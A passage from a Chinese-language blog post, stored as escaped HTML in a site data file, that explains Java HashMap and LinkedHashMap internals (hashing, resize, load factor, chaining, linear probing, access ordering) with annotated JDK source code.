first.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">            return first;</span><br><span class=\"line\">        if ((e = first.next) != null) &#123;</span><br><span class=\"line\">            if (first instanceof TreeNode)</span><br><span class=\"line\">                return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class=\"line\">            do &#123;</span><br><span class=\"line\">                if (e.hash == hash &amp;&amp;</span><br><span class=\"line\">                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class=\"line\">                    return e;</span><br><span class=\"line\">            &#125; while ((e = e.next) != null);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"1-3-6-resize\"><a href=\"#1-3-6-resize\" class=\"headerlink\" title=\"1.3.6 resize()\"></a>1.3.6 resize()</h6><p>resize()对散列表进行扩容。<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">final Node&lt;K,V&gt;[] resize() &#123;</span><br><span class=\"line\">   Node&lt;K,V&gt;[] oldTab = table;</span><br><span class=\"line\">   //容量</span><br><span class=\"line\">   int oldCap = (oldTab == null) ? 0 : oldTab.length;</span><br><span class=\"line\">   //负载</span><br><span class=\"line\">   int oldThr = threshold;</span><br><span class=\"line\">   int newCap, newThr = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">   if (oldCap &gt; 0) &#123;</span><br><span class=\"line\">       //大于等于最大容量，不能继续散列扩大</span><br><span class=\"line\">       if (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class=\"line\">           threshold = Integer.MAX_VALUE;</span><br><span class=\"line\">           return oldTab;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class=\"line\">                oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class=\"line\">          //扩大两倍</span><br><span class=\"line\">           newThr = oldThr &lt;&lt; 1; // double threshold</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   else if (oldThr &gt; 0) // initial capacity was placed in threshold</span><br><span class=\"line\">       newCap = oldThr;</span><br><span class=\"line\">   //第一次初始化散列表</span><br><span class=\"line\">   else &#123;               // zero initial threshold signifies using defaults</span><br><span class=\"line\">       newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class=\"line\">       newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   if (newThr == 0) &#123;</span><br><span class=\"line\">       float ft = (float)newCap * loadFactor;</span><br><span class=\"line\">       newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ?</span><br><span class=\"line\">                 (int)ft : Integer.MAX_VALUE);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   threshold = newThr;</span><br><span class=\"line\"></span><br><span class=\"line\">   //将旧的散列表复制到新的散列表</span><br><span class=\"line\">   @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class=\"line\">       Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap];</span><br><span class=\"line\">   table = newTab;</span><br><span class=\"line\">   if (oldTab != null) &#123;</span><br><span class=\"line\">       for (int j = 0; j &lt; oldCap; ++j) &#123;</span><br><span class=\"line\">           Node&lt;K,V&gt; e;</span><br><span class=\"line\">           if ((e = oldTab[j]) != null) &#123;</span><br><span class=\"line\">               oldTab[j] = null;</span><br><span class=\"line\">               if (e.next == null)</span><br><span class=\"line\">                   newTab[e.hash &amp; (newCap - 1)] = e;</span><br><span class=\"line\">              //树     </span><br><span class=\"line\">               else if (e instanceof TreeNode)</span><br><span class=\"line\">                   ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap);</span><br><span class=\"line\">              //链表</span><br><span class=\"line\">               else &#123; // preserve order</span><br><span class=\"line\">                   Node&lt;K,V&gt; loHead = null, loTail = null;</span><br><span class=\"line\">                   Node&lt;K,V&gt; hiHead = null, hiTail = null;</span><br><span class=\"line\">                   Node&lt;K,V&gt; next;</span><br><span class=\"line\">                   do &#123;</span><br><span class=\"line\">                       next = e.next;</span><br><span class=\"line\">                       if ((e.hash &amp; oldCap) == 0) &#123;</span><br><span class=\"line\">                           if (loTail == null)</span><br><span class=\"line\">                               loHead = e;</span><br><span class=\"line\">                           else</span><br><span class=\"line\">                               loTail.next = e;</span><br><span class=\"line\">                           loTail = e;</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\">                       else &#123;</span><br><span class=\"line\">                           if (hiTail == null)</span><br><span class=\"line\">                               hiHead = e;</span><br><span class=\"line\">                           else</span><br><span class=\"line\">                               hiTail.next = e;</span><br><span class=\"line\">                           hiTail = e;</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\">                   &#125; while ((e = next) != null);</span><br><span class=\"line\">                   if (loTail != null) &#123;</span><br><span class=\"line\">                       loTail.next = null;</span><br><span class=\"line\">                       newTab[j] = loHead;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">                   if (hiTail != null) &#123;</span><br><span class=\"line\">                       hiTail.next = null;</span><br><span class=\"line\">                       newTab[j + oldCap] = hiHead;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   return newTab;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-3-7-HashMap总结注意\"><a href=\"#1-3-7-HashMap总结注意\" class=\"headerlink\" title=\"1.3.7 HashMap总结注意\"></a>1.3.7 HashMap总结注意</h6><p>在散列表中有装载因子这么一个属性，当装载因子*初始容量小于散列表元素时，该散列表会再散列，扩容2倍！<br></p>\n<p>装载因子的默认值是0.75，无论是初始大了还是初始小了对我们HashMap的性能都不好<br></p>\n<ul>\n<li>装载因子初始值大了，可以减少散列表再散列(扩容的次数)，但同时会导致散列冲突的可能性变大(散列冲突也是耗性能的一个操作，要得操作链表(红黑树)！</li>\n<li>装载因子初始值小了，可以减小散列冲突的可能性，但同时扩容的次数可能就会变多！</li>\n</ul>\n<p>初始容量的默认值是16，它也一样，无论初始大了还是小了，对我们的HashMap都是有影响的：<br></p>\n<ul>\n<li>初始容量过大，那么遍历时我们的速度就会受影响~</li>\n<li>初始容量过小，散列表再散列(扩容的次数)可能就变得多，扩容也是一件非常耗费性能的一件事~</li>\n</ul>\n<p>从源码上我们可以发现：HashMap并不是直接拿key的哈希值来用的，它会将key的哈希值的高16位进行异或操作，使得我们将元素放入哈希表的时候增加了一定的随机性。<br></p>\n<p>还要值得注意的是：并不是桶子上有8位元素的时候它就能变成红黑树，它得同时满足我们的散列表容量大于64才行的<br></p>\n<h6 id=\"1-3-8-HashTable\"><a href=\"#1-3-8-HashTable\" class=\"headerlink\" title=\"1.3.8 HashTable\"></a>1.3.8 HashTable</h6><p>从存储结构和实现来讲基本上都是相同的。它和HashMap的最大的不同是它是线程安全的，另外它不允许key和value为null。Hashtable是个过时的集合类，不建议在新代码中使用，不需要线程安全的场合可以用HashMap替换，需要线程安全的场合可以用ConcurrentHashMap替换<br></p>\n<h4 id=\"2-LinkendHashMap\"><a href=\"#2-LinkendHashMap\" class=\"headerlink\" title=\"2.LinkendHashMap\"></a>2.LinkendHashMap</h4><p>LinkendHashMap 底层为 HashMap 和一个双向链表，保证了存储数据的有序.<br></p>\n<h5 id=\"2-1-内部节点类\"><a href=\"#2-1-内部节点类\" class=\"headerlink\" title=\"2.1 内部节点类\"></a>2.1 内部节点类</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static class Entry&lt;K,V&gt; extends HashMap.Node&lt;K,V&gt; &#123;</span><br><span class=\"line\">    Entry&lt;K,V&gt; before, after;</span><br><span class=\"line\">    Entry(int hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class=\"line\">        super(hash, key, value, next);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * The head (eldest) of the doubly linked list.</span><br><span class=\"line\"> */</span><br><span class=\"line\">transient LinkedHashMap.Entry&lt;K,V&gt; head;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * The tail (youngest) of the doubly linked list.</span><br><span class=\"line\"> */</span><br><span class=\"line\">transient LinkedHashMap.Entry&lt;K,V&gt; tail;</span><br></pre></td></tr></table></figure>\n<p>可以看出，是在HashMap的节点上，添加了before/after的一个双向链表.<br></p>\n<h4 id=\"2-2-accessOrder\"><a href=\"#2-2-accessOrder\" class=\"headerlink\" title=\"2.2 accessOrder\"></a>2.2 accessOrder</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * The iteration ordering method for this linked hash map: &lt;tt&gt;true&lt;/tt&gt;</span><br><span class=\"line\"> * for access-order, &lt;tt&gt;false&lt;/tt&gt; for insertion-order.</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @serial</span><br><span class=\"line\"> */</span><br><span class=\"line\">final boolean accessOrder;</span><br><span class=\"line\"></span><br><span class=\"line\">//带accessOrder的构造方法， 不带该参数时，默认为false</span><br><span class=\"line\">public LinkedHashMap(int initialCapacity,</span><br><span class=\"line\">                     float loadFactor,</span><br><span class=\"line\">                     boolean accessOrder) &#123;</span><br><span class=\"line\">    super(initialCapacity, loadFactor);</span><br><span class=\"line\">    this.accessOrder = accessOrder;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>LinkedHashMap 是有序的， accessOrder 可以控制其排序方式.<br></p>\n<ul>\n<li>true</li>\n</ul>\n<p>基于访问排序（使用 LRU 最近最少使用算法)</p>\n<ul>\n<li>false</li>\n</ul>\n<p>基于插入排序</p>\n<h4 id=\"2-3-重写HashMap方法\"><a href=\"#2-3-重写HashMap方法\" class=\"headerlink\" title=\"2.3 重写HashMap方法\"></a>2.3 重写HashMap方法</h4><p>因为在HashMap的基础上，添加了双向链表，所以得重写HashMap 的部分方法<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.初始化散列表时，也初始化双向链表</span><br><span class=\"line\">void reinitialize() &#123;</span><br><span class=\"line\">    super.reinitialize();</span><br><span class=\"line\">    head = tail = null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//2.创建entry时，将entry加入双向链表的末尾</span><br><span class=\"line\">//可以看出，新节点不再是 Node 而是 Entry</span><br><span class=\"line\">Node&lt;K,V&gt; newNode(int hash, K key, V value, Node&lt;K,V&gt; e) &#123;</span><br><span class=\"line\">    LinkedHashMap.Entry&lt;K,V&gt; p =</span><br><span class=\"line\">        new LinkedHashMap.Entry&lt;K,V&gt;(hash, key, value, e);</span><br><span class=\"line\">    linkNodeLast(p);</span><br><span class=\"line\">    return p;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private void linkNodeLast(LinkedHashMap.Entry&lt;K,V&gt; p) &#123;</span><br><span class=\"line\">   LinkedHashMap.Entry&lt;K,V&gt; last = tail;</span><br><span class=\"line\">   tail = p;</span><br><span class=\"line\">   if (last == null)</span><br><span class=\"line\">       head = p;</span><br><span class=\"line\">   else &#123;</span><br><span class=\"line\">       p.before = last;</span><br><span class=\"line\">       last.after = p;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里只是举了两个例子，其它还有很多方式也类似的重写，添上对双向链表的操作。<br></p>\n<h4 id=\"2-4-构造方法\"><a href=\"#2-4-构造方法\" class=\"headerlink\" title=\"2.4 构造方法\"></a>2.4 构造方法</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public LinkedHashMap(int initialCapacity, float loadFactor) &#123;</span><br><span class=\"line\">   super(initialCapacity, loadFactor);</span><br><span class=\"line\">   accessOrder = false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedHashMap(int initialCapacity) &#123;</span><br><span class=\"line\">   super(initialCapacity);</span><br><span class=\"line\">   accessOrder = false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedHashMap() &#123;</span><br><span class=\"line\">   super();</span><br><span class=\"line\">   accessOrder = false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedHashMap(Map&lt;? extends K, ? extends V&gt; m) &#123;</span><br><span class=\"line\">    super();</span><br><span class=\"line\">    accessOrder = false;</span><br><span class=\"line\">    putMapEntries(m, false);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public LinkedHashMap(int initialCapacity, float loadFactor,   boolean accessOrder) &#123;</span><br><span class=\"line\">   super(initialCapacity, loadFactor);</span><br><span class=\"line\">   this.accessOrder = accessOrder;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-5-get\"><a href=\"#2-5-get\" class=\"headerlink\" title=\"2.5  get()\"></a>2.5  get()</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public V get(Object key) &#123;</span><br><span class=\"line\">   Node&lt;K,V&gt; e;</span><br><span class=\"line\">   if ((e = getNode(hash(key), key)) == null)</span><br><span class=\"line\">       return null;</span><br><span class=\"line\">   if (accessOrder)</span><br><span class=\"line\">       afterNodeAccess(e);</span><br><span class=\"line\">   return e.value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void afterNodeAccess(Node&lt;K,V&gt; e) &#123; // move node to last</span><br><span class=\"line\">    LinkedHashMap.Entry&lt;K,V&gt; last;</span><br><span class=\"line\">    if (accessOrder &amp;&amp; (last = tail) != e) &#123;</span><br><span class=\"line\">        LinkedHashMap.Entry&lt;K,V&gt; p =</span><br><span class=\"line\">            (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after;</span><br><span class=\"line\">        p.after = null;</span><br><span class=\"line\">        if (b == null)</span><br><span class=\"line\">            head = a;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            b.after = a;</span><br><span class=\"line\">        if (a != null)</span><br><span class=\"line\">            a.before = b;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            last = b;</span><br><span class=\"line\">        if (last == null)</span><br><span class=\"line\">            head = p;</span><br><span class=\"line\">        else &#123;</span><br><span class=\"line\">            p.before = last;</span><br><span class=\"line\">            last.after = p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        tail = p;</span><br><span class=\"line\">        ++modCount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在 accessOder的情况下， 每次 get 后  会将该元素放到双向链表最后</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一-Map和Collection\"><a href=\"#一-Map和Collection\" class=\"headerlink\" title=\"一.Map和Collection\"></a>一.Map和Collection</h3><p>Java 集合类总共两大接口: Map 和 Collection<br></p>\n<p>其中: Map 中元素是成对出现的(key, value), Collection 中元素是单独出现的.  如:<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Map&lt;String,String&gt; //true ,成对</span><br><span class=\"line\"></span><br><span class=\"line\">List&lt;String&gt; //true, 单独</span><br><span class=\"line\">List&lt;Map&lt;String,String&gt;&gt;// true, 单独， 一个Map对象</span><br><span class=\"line\"></span><br><span class=\"line\">List&lt;String, String&gt; //false</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"二-主要实现类\"><a href=\"#二-主要实现类\" class=\"headerlink\" title=\"二.主要实现类\"></a>二.主要实现类</h3><ul>\n<li>HashMap</li>\n<li>ConcurrentHashMapp</li>\n<li>HashTable</li>\n<li>TreeMap</li>\n<li>LinkendHashMap</li>\n</ul>\n<h3 id=\"三-具体实现\"><a href=\"#三-具体实现\" class=\"headerlink\" title=\"三.具体实现\"></a>三.具体实现</h3><h4 id=\"1-HashMap\"><a href=\"#1-HashMap\" class=\"headerlink\" title=\"1.HashMap\"></a>1.HashMap</h4><p>在JDK1.8中 HashMap由位桶+链表+红黑树实现.<br></p>\n<h5 id=\"1-1-散列表\"><a href=\"#1-1-散列表\" class=\"headerlink\" title=\"1.1 散列表\"></a>1.1 散列表</h5><h6 id=\"1-1-1-概念\"><a href=\"#1-1-1-概念\" class=\"headerlink\" title=\"1.1.1 概念\"></a>1.1.1 概念</h6><p>原文：<a href=\"https://www.cnblogs.com/absfree/p/5508570.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/absfree/p/5508570.html</a><br></p>\n<p>符号表是一种用于存储键值对（key-value pair）的数据结构，我们平常经常使用的数组也可以看做是一个特殊的符号表，数组中的“键”即为数组索引，值为相应的数组元素。也就是说，当符号表中所有的键都是较小的整数时，我们可以使用数组来实现符号表，将数组的索引作为键，而索引处的数组元素即为键对应的值，但是这一表示仅限于所有的键都是比较小的整数时，否则可能会使用一个非常大的数组。<strong>散列表是对以上策略的一种“升级”，但是它可以支持任意的键而并没有对它们做过多的限定。</strong> <br><br>对于基于散列表实现的符号表，若我们要在其中查找一个键，需要进行以下步骤：<br></p>\n<ul>\n<li><p>首先我们使用散列函数将给定键转化为一个“数组的索引”，理想情况下，不同的key会被转为不同的索引，但在实际应用中我们会遇到不同的键转为相同的索引的情况，这种情况叫做碰撞。</p>\n</li>\n<li><p>得到了索引后，我们就可以像访问数组一样，通过这个索引访问到相应的键值对。</p>\n</li>\n</ul>\n<p>以上就是散列表的核心思想，散列表是 <strong>时空权衡</strong> 的经典例子。当我们的空间无限大时，我们可以直接使用一个很大的数组来保存键值对，并用key作为数组索引，因为空间不受限，所以我们的键的取值可以无穷大，因此查找任何键都只需进行一次普通的数组访问。反过来，若对查找操作没有任何时间限制，我们就可以直接使用链表来保存所有键值对，这样把空间的使用降到了最低，但查找时只能顺序查找。在实际的应用中，我们的时间和空间都是有限的，所以我们必须在两者之间做出权衡，散列表就在时间和空间的使用上找到了一个很好的平衡点。散列表的一个优势在于我们只需调整散列算法的相应参数而无需对其他部分的代码做任何修改就能够在时间和空间的权衡上做出策略调整。<br></p>\n<h6 id=\"1-1-2-散列函数\"><a href=\"#1-1-2-散列函数\" class=\"headerlink\" title=\"1.1.2 散列函数\"></a>1.1.2 散列函数</h6><p>在散列表内部，我们使用 <strong>桶（bucket）</strong>来保存键值对，我们前面所说的数组索引即为桶号，决定了给定的键存于散列表的哪个桶中。散列表所拥有的桶数被称为散列表的<strong> 容量（capacity）</strong><br></p>\n<p>现在假设我们的散列表中有M个桶，桶号为0到M-1。我们的散列函数的功能就是把任意给定的key转为[0, M-1]上的整数。我们对散列函数有两个基本要求：一是计算时间要短，二是尽可能把键分布在不同的桶中。对于不同类型的键，我们需要使用不同的散列函数，这样才能保证有比较好的散列效果。<br></p>\n<p>我们使用的散列函数应该尽可能满足均匀散列假设,使用的散列函数能够均匀并独立地将所有的键散布于0到M – 1之间。这样一来，满足均匀性与独立性能够保证键值对在散列表的分布尽可能的均匀，不会出现“许多键值对被散列到同一个桶，而同时许多桶为空”的情况。<br></p>\n<p>Java中的常用类，基本都重写了 <strong>hashCode()</strong> 方法，用于获取其散列值.<br></p>\n<h6 id=\"1-1-3-获取桶号\"><a href=\"#1-1-3-获取桶号\" class=\"headerlink\" title=\"1.1.3 获取桶号\"></a>1.1.3 获取桶号</h6><p>前面我们介绍了计算对象hashCode的一些方法，那么我们获取了hashCode之后，如何进一步得到桶号呢？一个直接的办法就是直接拿得到的hashCode除以capacity（桶的数量），然后用所得的余数作为桶号。不过在Java中，hashCode是int型的，而Java中的int型均为有符号，所以我们要是直接使用返回的hashCode的话可能会得到一个负数，显然桶号是不能为负的。所以我们先将返回的hashCode转变为一个非负整数，再用它除以capacity取余数，作为key的对应桶号，具体代码如下：<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private int hash(K key) &#123;</span><br><span class=\"line\">    return (key.hashCode() &amp; 0x7fffffff) % M;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-1-4-处理碰撞\"><a href=\"#1-1-4-处理碰撞\" class=\"headerlink\" title=\"1.1.4 处理碰撞\"></a>1.1.4 处理碰撞</h6><ul>\n<li>拉链法</li>\n</ul>\n<p>以这种方式实现的散列表，每个桶里都存放了一个链表。初始时所有链表均为空，当一个键被散列到一个桶时，这个键就成为相应桶中链表的首结点，之后若再有一个键被散列到这个桶（即发生碰撞），第二个键就会成为链表的第二个结点，以此类推。这样一来，当桶数为M，散列表中存储的键值对数目为N时，平均每个桶中的链表包含的结点数为N / M。因此，当我们查找一个键时，首先通过散列函数确定它所在的桶，这一步所需时间为O(1)；然后我们依次比较桶中结点的键与给定键，若相等则找到了指定键值对，这一步所需时间为O(N / M)。所以查找操作所需的时间为O(N / M)，而通常我们都能够保证N是M的常数倍，所以散列表的查找操作的时间复杂度为O(1)，同理我们也可以得到插入操作的复杂度也为O(1)。<br></p>\n<p>在上面的实现中，我们固定了散列表的桶数，当我们明确知道我们要插入的键值对数目最多只能到达桶数的常数倍时，固定桶数是完全可行的。但是若键值对数目会增长到远远大于桶数，我们就需要动态调整桶数的能力。实际上，散列表中的键值对数与桶数的比值叫做负载因子（load factor）。通常负载因子越小，我们进行查找所需时间就越短，而空间的使用就越大；若负载因子较大，则查找时间会变长，但是空间使用会减小。比如，Java标准库中的HashMap就是基于拉链法实现的散列表，它的默认负载因子为0.75。HashMap实现动态调整桶数的方式是基于公式loadFactor = maxSize / capacity，其中maxSize为支持存储的最大键值对数，而loadFactor和capacity（桶数）都会在初始化时由用户指定或是由系统赋予默认值。当HashMap中的键值对的数目达到了maxSize时，就会增大散列表中的桶数。<br></p>\n<ul>\n<li>线性探测法</li>\n</ul>\n<p>线性探测法是另一种散列表的实现策略的具体方法，这种策略叫做开放定址法。开放定址法的主要思想是：用大小为M的数组保存N个键值对，其中M &gt; N，数组中的空位用于解决碰撞问题。线性探测法的主要思想是：当发生碰撞时（一个键被散列到一个已经有键值对的数组位置），我们会检查数组的下一个位置，这个过程被称作线性探测。<br></p>\n<p>线性探测可能会产生三种结果:<br><br>命中：该位置的键与要查找的键相同；<br><br>未命中：该位置为空；<br><br>该位置的键和被查找的键不同。<br></p>\n<p>当我们查找某个键时，首先通过散列函数得到一个数组索引后，之后我们就开始检查相应位置的键是否与给定键相同，若不同则继续查找（若到数组末尾也没找到就折回数组开头），直到找到该键或遇到一个空位置。由线性探测的过程我们可以知道，若数组已满的时候我们再向其中插入新键，会陷入无限循环之中。<br></p>\n<p>有必要实现动态增长数组来保持查找操作的常数时间复杂度。当键值对总数很小时，若空间比较紧张，可以动态缩小数组，这取决于实际情况。<br></p>\n<h5 id=\"1-2-红黑树\"><a href=\"#1-2-红黑树\" class=\"headerlink\" title=\"1.2 红黑树\"></a>1.2 红黑树</h5><h6 id=\"1-2-1-二叉查找树\"><a href=\"#1-2-1-二叉查找树\" class=\"headerlink\" title=\"1.2.1 二叉查找树\"></a>1.2.1 二叉查找树</h6><p>二叉查找树（Binary Search Tree），也称有序二叉树（ordered binary tree）,排序二叉树（sorted binary 